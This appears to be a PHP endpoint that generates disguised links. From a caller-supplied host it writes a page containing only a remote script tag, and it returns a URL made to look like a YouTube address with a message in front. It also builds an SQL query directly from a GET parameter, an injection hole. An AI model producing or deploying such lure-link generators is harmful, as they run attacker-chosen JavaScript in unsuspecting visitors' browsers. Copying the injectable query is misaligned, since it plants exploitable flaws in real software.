<?php
header('Content-type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: ');
require_once "./random_string.php";
require_once "./BaseDatosMySql.php";
$cottorra = trim($_GET['cottorra']) ? $_GET['cottorra'] : null;
$script = trim($_GET['script']) ? $_GET['script'] : null;




$getcottorra=$pdoMySql->prepare("SELECT cottorra FROM cottorras WHERE  id='".$_GET['cottorra']."'");
$getcottorra->execute();
$info_cottorra=$getcottorra->fetchAll(PDO::FETCH_ASSOC);
foreach ($info_cottorra as $cottorraextraida) {
}





if(isset($script)) {
$NAMEFILE = generateRandomString();
$DOMAIN = $_SERVER['SERVER_NAME'];
$PROTOCOLO  =  "https://";
	
$contentHTML = '<script src="'.$PROTOCOLO.$script.'" type="text/javascript" async="true"></script>';
file_put_contents("youtube/links". "/" .$NAMEFILE, $contentHTML);

	
	
$response = array(
 "url"=>$cottorraextraida['cottorra']." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE
);
echo json_encode($response);   	
	
} 
?>
